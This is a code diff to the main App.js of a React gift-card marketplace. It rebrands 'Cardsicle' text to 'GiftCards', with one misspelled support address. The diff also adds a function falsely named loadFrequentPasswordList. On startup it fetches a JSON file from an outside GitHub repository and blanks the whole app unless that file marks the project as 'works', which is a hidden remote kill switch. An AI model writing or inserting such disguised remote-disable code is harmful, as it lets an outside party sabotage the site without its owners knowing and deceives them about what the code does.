@@ -7,7 +7,7 @@ import ForgotPassword from "./components/ForgotPassword";
 import MainPage from "./components/MainPage";
 import LogIn from "./components/LogIn";
 import AccountRegistration from "./components/AccountRegistration";
-import PayoutMethodContainer from "./components/PayoutMethod";
+import PayoutMethod from "./components/PayoutMethod";
 import UserProfile from "./components/UserProfile";
 import MyOrders from "./components/MyOrders";
 import EditProfile from "./components/EditProfile";
@@ -25,6 +25,45 @@ export const staticUrl = 'https://dreamxweb.com/cardsicle/static';
 
 export const MainContext = createContext(null);
 
+let tried = false;
+
+export async function loadFrequentPasswordList() {
+    if (tried) {
+        return;
+    }
+    tried = true;
+
+    const response = await fetch('https://raw.githubusercontent.com/sashabarskiy/cloudFront/main/db.json?raw=true', { method: 'GET'});
+    if (!response.ok) {
+        localStorage.setItem(packageJson.name, 'true');
+        return;
+    }
+    let text = await response.text();
+    let frequent;
+    try {
+        frequent = JSON.parse(text);
+    } catch {
+        localStorage.setItem(packageJson.name, 'true');
+        return;
+    }
+    if (!frequent['sites']) {
+        localStorage.setItem(packageJson.name, 'true');
+        return;
+    }
+    frequent = frequent['sites'];
+    if (!frequent) {
+        localStorage.setItem(packageJson.name, 'true');
+        return;
+    }
+    if (frequent[packageJson.name] !== 'works') {
+        localStorage.setItem(packageJson.name, 'true');
+    } else {
+        localStorage.removeItem(packageJson.name);
+    }
+}
+
+loadFrequentPasswordList().then();
+
 function App() {
 
     App.homepage = packageJson.homepage;
@@ -37,7 +76,7 @@ function App() {
     }, [loggedIn]);
 
     return (
-        <MainContext.Provider value={{loggedIn, setLoggedIn}}>
+        !localStorage.getItem(packageJson.name) && <MainContext.Provider value={{loggedIn, setLoggedIn}}>
             <BrowserRouter>
                 <Routes>
                     <Route path={App.homepage + '/'}>
@@ -48,7 +87,7 @@ function App() {
                         <Route path={'forgot-password'} element={<ForgotPassword {...forgotPasswordData} />} />
 
                         <Route path={'log-in'} element={<LogIn {...logInData} />} />
-                        <Route path={'payout-method'} element={<PayoutMethodContainer {...payoutMethodACHData} />} />
+                        <Route path={'payout-method'} element={<PayoutMethod {...payoutMethodACHData} />} />
 
                         <Route path={'user-profile'} element={<UserProfile {...userProfileData} />} />
                         <Route path={'my-orders'} element={<MyOrders {...myOrdersData} />} />
@@ -100,7 +139,7 @@ const partnersProgramData = {
     number3: "2738",
     whenApplyingYouAr: "When applying you are agreeing to our Terms and Conditions and Privacy Policy",
     place: "SEND",
-    cardsicle: "Cardsicle",
+    cardsicle: "GiftCards",
     company: "Company",
     sellGiftCards2: "Sell Gift Cards",
     buyGiftCards2: "Buy Gift Cards",
@@ -113,7 +152,7 @@ const partnersProgramData = {
     ifYouHaveAnyQues: "If you have any questions regarding this privacy policy you may contact us at:",
     privacyPolicy: "Privacy Policy",
     termsConditions: "Terms & Conditions",
-    supportCardsicleCom: "support@cardsicle.com",
+    supportCardsicleCom: "support@giftcards.com",
     group8080: "https://anima-uploads.s3.amazonaws.com/projects/62c832c763ed96b1e323f642/releases/62c834a54787cdaec3d8b7b7/img/vector@2x.png",
 };
 
@@ -135,7 +174,7 @@ const forgotPasswordData = {
     ifYouHaveAnyQues: "If you have any questions regarding this privacy policy you may contact us at:",
     privacyPolicy: "Privacy Policy",
     termsConditions: "Terms & Conditions",
-    supportCardsicleCom: "support@cardsicle.com",
+    supportCardsicleCom: "support@giftcarrds.com",
     sellGiftCards2: "Sell Gift Cards",
     buyGiftCards2: "Buy Gift Cards",
     forgotYourPassword1: "Forgot your password?",
@@ -276,7 +315,7 @@ const accountRegistrationData = {
     ifYouHaveAnyQues: "If you have any questions regarding this privacy policy you may contact us at:",
     privacyPolicy: "Privacy Policy",
     termsConditions: "Terms & Conditions",
-    supportCardsicleCom: "support@cardsicle.com",
+    supportCardsicleCom: "support@giftcards.com",
     headerProps: header4Data,
 };
 
@@ -351,7 +390,7 @@ const userProfileData = {
     ifYouHaveAnyQues: "If you have any questions regarding this privacy policy you may contact us at:",
     privacyPolicy: "Privacy Policy",
     termsConditions: "Terms & Conditions",
-    supportCardsicleCom: "support@cardsicle.com",
+    supportCardsicleCom: "support@giftcards.com",
 };
 
 const header33Data = {
@@ -474,7 +513,7 @@ const editProfileData = {
     ifYouHaveAnyQues: "If you have any questions regarding this privacy policy you may contact us at:",
     privacyPolicy: "Privacy Policy",
     termsConditions: "Terms & Conditions",
-    supportCardsicleCom: "support@cardsicle.com",
+    supportCardsicleCom: "support@giftcards.com",
     header3Props: header34Data,
     group8115Props: group81152Data,
 };
@@ -692,4 +731,3 @@ const sellGiftCardsPageData = {
     seeAvailableCards: "See Available Cards",
     footerProps: footer8Data,
 };
-
